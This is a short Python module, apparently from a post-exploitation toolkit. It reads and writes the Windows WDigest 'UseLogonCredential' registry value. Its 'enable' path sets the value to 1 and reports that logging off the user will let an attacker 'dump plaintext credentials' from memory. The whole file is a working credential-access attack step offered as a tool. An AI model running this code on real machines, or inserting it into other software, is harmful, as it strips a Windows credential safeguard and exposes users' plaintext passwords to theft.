from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

import sys

if sys.version_info.major > 2:
    from winreg import (
        HKEY_LOCAL_MACHINE, KEY_READ, KEY_WRITE, REG_DWORD,
        ConnectRegistry, OpenKey, SetValueEx, CloseKey, QueryValueEx
    )
else:
    from _winreg import (
        HKEY_LOCAL_MACHINE, KEY_READ, KEY_WRITE, REG_DWORD,
        ConnectRegistry, OpenKey, SetValueEx, CloseKey, QueryValueEx
    )


def modifyKey(keyPath, regPath, value, root=HKEY_LOCAL_MACHINE):
    aReg = ConnectRegistry(None, root)

    try:
        aKey = OpenKey(aReg, keyPath, 0, KEY_WRITE)
        SetValueEx(aKey, regPath, 0, REG_DWORD, value)
        CloseKey(aKey)
    except Exception as e:
        return False, e

    return True, ''


def queryValue(keyPath, regPath, root=HKEY_LOCAL_MACHINE):
    aReg = ConnectRegistry(None, root)
    try:
        aKey = OpenKey(aReg, keyPath, 0, KEY_READ)
        value = QueryValueEx(aKey, regPath)
        CloseKey(aKey)
        if value[0] == 0:
            return False, 'UseLogonCredential disabled'
        else:
            return True, 'UseLogonCredential already enabled'
    except:
        return False, 'UseLogonCredential key not found, you should create it'


def wdigest(action):
    key_path = r"SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\"
    key_name = 'UseLogonCredential'

    if action == 'check':
        return queryValue(key_path, key_name)
    elif action == 'enable':
        ok, message = modifyKey(key_path, key_name, 1)
        if ok:
            message = 'UseLogonCredential key created, logoff the user session to dump plaintext credentials'
        return ok, message
    elif action == 'disable':
        ok, message = modifyKey(key_path, key_name, 0)
        if ok:
            message = 'UseLogonCredential key deleted'
        return ok, message
